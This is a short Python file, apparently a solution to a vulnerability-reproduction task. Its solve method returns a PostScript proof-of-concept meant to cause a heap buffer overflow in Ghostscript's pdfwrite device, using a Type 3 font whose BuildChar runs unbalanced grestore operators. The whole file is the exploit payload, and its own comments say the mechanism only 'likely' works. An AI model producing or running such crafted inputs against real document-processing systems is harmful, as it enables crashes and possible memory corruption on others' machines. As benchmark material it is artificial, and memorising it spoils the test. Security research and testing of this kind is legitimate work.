import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the heap buffer overflow in pdfwrite.
        
        The vulnerability exists in the restoration of viewer state where the code
        fails to check if the viewer depth is at least 1 before decrementing/accessing.
        We trigger this by defining a Type 3 font and performing unbalanced 'grestore'
        operations within the BuildChar procedure. This forces the pdfwrite device
        (which tracks state during the Capture of the character) to underflow its
        internal viewer depth counter.
        """
        
        # PostScript payload
        # 1. Define a Type 3 font.
        # 2. In BuildChar, issue multiple 'grestore' operators.
        #    This attempts to pop the graphics state stack beyond the current context.
        #    pdfwrite's internal 'viewer_depth' tracking likely gets out of sync or underflows.
        
        poc = (
            b"%!PS\n"
            b"/FontDict 8 dict def\n"
            b"FontDict begin\n"
            b"  /FontType 3 def\n"
            b"  /FontMatrix [1 0 0 1 0 0] def\n"
            b"  /FontBBox [0 0 100 100] def\n"
            b"  /Encoding 256 array def\n"
            b"  0 1 255 {Encoding exch /.notdef put} for\n"
            b"  Encoding 65 /A put\n"
            b"  /BuildChar {\n"
            b"    pop pop\n"
            b"    100 0 setcharwidth\n"
            b"    % Trigger the vulnerability: unbalanced restore\n"
            b"    grestore grestore grestore grestore\n"
            b"    newpath 0 0 moveto 10 10 lineto stroke\n"
            b"  } bind def\n"
            b"end\n"
            b"/TestFont FontDict definefont pop\n"
            b"/TestFont findfont 20 scalefont setfont\n"
            b"100 100 moveto\n"
            b"(A) show\n"
            b"showpage\n"
        )
        
        return poc
